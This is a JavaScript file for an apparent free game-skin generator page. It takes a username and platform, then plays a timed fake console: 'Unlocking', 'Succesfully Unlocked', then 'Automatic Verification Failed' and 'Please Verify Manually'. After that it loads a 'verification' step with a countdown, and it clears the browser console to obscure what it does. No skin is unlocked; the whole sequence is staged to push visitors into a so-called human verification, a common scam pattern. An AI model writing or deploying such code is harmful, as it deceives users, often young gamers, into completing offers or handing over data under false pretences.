//
//
//counter.mind
//
//
$(document).ready(function() {
	////////////////
	// Console Strings
	//////////////// 
	$console_msg_string_1 = "Loading...";
	$console_msg_string_2 = "Preparing to unlock <span class='console-skin'></span> skin...";
	$console_msg_string_3 = "Unlocking <span class='console-skin'></span> for <span class='console-username'></span>";
	$console_msg_string_4 = "<span class='console-skin'></span> Succesfully Unlocked";
	$console_msg_string_5 = "Performing Verification...";
	$console_msg_string_6 = "Automatic Verification Failed";
	$console_msg_string_7 = "Please Verify Manually";
	
	////////////////
	// Human Verification Timer
	////////////////
	var $human_verification_timer_value = '180'; //Countdown remaing time in seconds	
	
	////////////////
	// Sound Settings: 1 = ON | 0 = OFF
	//////////////// 
	$sound_setting = 1;		
	ion.sound({
		sounds: [
			{
				name: "button",
				path: "audio/",
				volume: 1
			},
			{
				name: "transition-1",
				path: "audio/",
				volume: 0.9
			},
			{
				name: "transition-2",
				path: "audio/",
				volume: 0.7
			}
		],
		path: "audio/",
		preload: true,
		multiplay: true
	});	
	function aO(el, anim, onDone) {
		var $el = $(el);
		$el.addClass( 'animated ' + anim );
		$el.one( 'animationend', function() {
			$(this).removeClass( 'animated ' + anim );
			onDone && onDone();
		});
	}
	function gS(step, onStep) {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'bdprts/' + step + '.php');
        xhr.setRequestHeader("X-REQUESTED-WITH", 'xmlhttprequest');
        xhr.addEventListener('readystatechange', function() {
            if (xhr.readyState == 4) {
                onStep && onStep(xhr.responseText)
            }
        });
        xhr.send()
		console.clear();
		console.log("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
    }
	$c_s_m = ".console-msg";
	$ms = "<span class='lnr lnr-checkmark-circle m-success'></span>";
	$me = "<span class='lnr lnr-cross-circle m-error'></span>";
	$ml = '<div class="spinner"></div>';
	function progressBarConsole(percent, $element, duration) {
		var progressBarConsoleWidth = percent * $element.width() / 100;
		$element.find('div').animate({ width: progressBarConsoleWidth }, duration).html(percent + "%&nbsp;");
	}
	
	$('.skin-select-grid-item-inner').click(function () {
		selected_name = $(this).find(".skin-name").html();
		selected_image = $(this).find("img.skin-img").attr("src");
		$('.skin-select-section').append('<div class="j-p-w"></div>');
		gg();
	});
	function gg() {		
		gS("swstp-1", function(src) {
			$('.j-p-w').html(src).hide().fadeIn();
			$('.skin-description-wrapper .skin-name').html(selected_name).hide().fadeIn();
			$('.skin-item-image').attr("src", selected_image);
			setTimeout(function() {
				if ($sound_setting == 1) {
					ion.sound.play("transition-2");
				}
			}, 150 );
			$.magnificPopup.open({
				items: {
					src: '.step-frame',
				},
				type: 'inline',
				preloader: false,
				modal: true,
				fixedContentPos: true,
				fixedBgPos: true,
				callbacks: {	
					open: function() {
						var selected_platform;	
						selected_platform = '';
						function fixplatformBox($platform_parent_class) {
							resetplatformBoxes();
							if ($platform_parent_class.hasClass('platform-item-1')) {
								selected_platform = 'Android';
							}
							if ($platform_parent_class.hasClass('platform-item-2')) {
								selected_platform = 'Xbox';
							}
							if ($platform_parent_class.hasClass('platform-item-3')) {
								selected_platform = 'Playstation';
							}
							if ($platform_parent_class.hasClass('platform-item-4')) {
								selected_platform = 'Android';
							}
							if ($platform_parent_class.hasClass('platform-item-5')) {
								selected_platform = 'iOS';
							}
							$platform_parent_class.addClass('active');
							$platform_parent_class.addClass('animated jello').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
								$(this).removeClass('animated jello');
							});	
						}	
						function resetplatformBoxes() {
							var $platform_list = $('.platform-item-1, .platform-item-2, .platform-item-3, .platform-item-4, .platform-item-5');	
							if ($platform_list.hasClass('active')) {
								$platform_list.removeClass('active');
							}
						}	
						$('.platform-item').click(function() {
							fixplatformBox($(this));		
							ion.sound.play("button");	
						});
						$(document).on('click', '.c-n-b', function(){
							if ($sound_setting == 1) {
								ion.sound.play("button");
							}
							if ($('#username-input').val() == '') {
								aO( $('.username-input-wrapper'), 'shake' );
								$('.error-w-1').fadeIn(function() {					
									setTimeout(function(){ $('.error-w-1').fadeOut() }, 1000);
								});
							}
							else if (selected_platform == '') {
								aO( $('.platforms-wrapper'), 'shake' );
								$('.error-w-2').fadeIn(function() {					
									setTimeout(function(){ $('.error-w-2').fadeOut() }, 1000);
								});
							}								
							else {
								$console_username = $("#username-input").val();
								gS("swstp-2", function(src) {
									$('.step-content').html(src).hide().fadeIn();
									progressBarConsole(0, $('#progressBarConsole'), 1);
									setTimeout(function() {
										if ($sound_setting == 1) {
											ion.sound.play("transition-2");
										}
									}, 150 );
									sT(0, $console_msg_string_1, $ml, 1, 0, 15, 0, 0, 0);
									sT(3000, $console_msg_string_2, $ml, 1, 0, 35, 0, 0, 1);
									sT(6000, $console_msg_string_3, $ml, 1, 0, 45, 1, 1, 1);
									sT(12500, $console_msg_string_4, $ms, 1, 0, 70, 0, 2, 1);
									sT(15500, $console_msg_string_5, $ml, 1, 0, 80, 0, 0, 0);
									sT(18500, $console_msg_string_6, $me, 1, 0, 90, 0, 0, 0);
									sT(22500, $console_msg_string_7, $ml, 1, 0, 90, 0, 0, 0);
									sT(24500, '', '', 0, 1);
								})
							}	
						});
					}
				}
			});	
		})
	}
	function sT(tD, cms, mt, la, vp, lbp, se, sc, ss) {
		setTimeout(function() {			
			var $mt = $(mt);
			$('.console-loader').html(mt);
			if (la === 1) { aO( $('.console-loader'), 'bounceIn' ); }		
			$($c_s_m).html(cms);
			aO( $($c_s_m), 'bounceIn' );
			progressBarConsole(lbp, $('#progressBarConsole'), 500);
			if (vp === 1) {
				gS( "verification", function(src) {
					$( '.step-content' ).html(src).hide().fadeIn();
					$( '.v-username' ).html($console_username);
					$( '.v-skin' ).html(selected_name);
					human_verification_timer.init($human_verification_timer_value);
				});
			}
			if (sc === 1) {				
				$(".console-loader").fadeOut(function(){	
					aO( $('.console-skin-unlocking'), 'bounceIn' );
					$(".console-skin-unlocking").fadeIn(function(){																							
						$('.console-skin-unlocking-val').countTo({
							from: 0,
							to: 100,
							speed: 5000,
							refreshInterval: 5
						});
					});
				});
			}
			if (sc === 2) {
				$(".console-skin-unlocking").fadeOut(function(){																							
					$(".console-loader").fadeIn();
				});
			}
			if (ss === 1) {
               $('.console-skin').html(selected_name);
            }
			if (se === 1) {
               $('.console-username').html($console_username);
            }
		}, tD );
	}	
});
////////////////
// Human Verification Countdown
////////////////
var human_verification_timer = function () {
    var time_left = 15;
    var keep_counting = 1;
    var time_out_msg = 'few seconds';
    function countdown() {
        if(time_left < 2) {
            keep_counting = 0;
        }
        time_left = time_left - 1;
    }
    function add_leading_zero( n ) {
        if(n.toString().length < 2) {
            return '0' + n;
        } else {
            return n;
        }
    }
    function format_output() {
        var hours, minutes, seconds;
        seconds = time_left % 60;
        minutes = Math.floor(time_left / 60) % 60;
        hours = Math.floor(time_left / 3600);   
        seconds = add_leading_zero( seconds );
        minutes = add_leading_zero( minutes );
        hours = add_leading_zero( hours );
        return minutes + ' minutes and ' + seconds + ' seconds';
    }
    function timer_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = '<span>' + format_output() + '</span>';
    }
    function no_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = time_out_msg;
    }
    return {
        count: function () {
            countdown();
            timer_time_left();
        },
        timer: function () {
            human_verification_timer.count();
            if(keep_counting) {
                setTimeout("human_verification_timer.timer();", 1000);
            } else {
                no_time_left();
            }
        },
        init: function (n) {
            time_left = n;
            human_verification_timer.timer();
        }
    };
}();
//
//
//counter.mind
//
//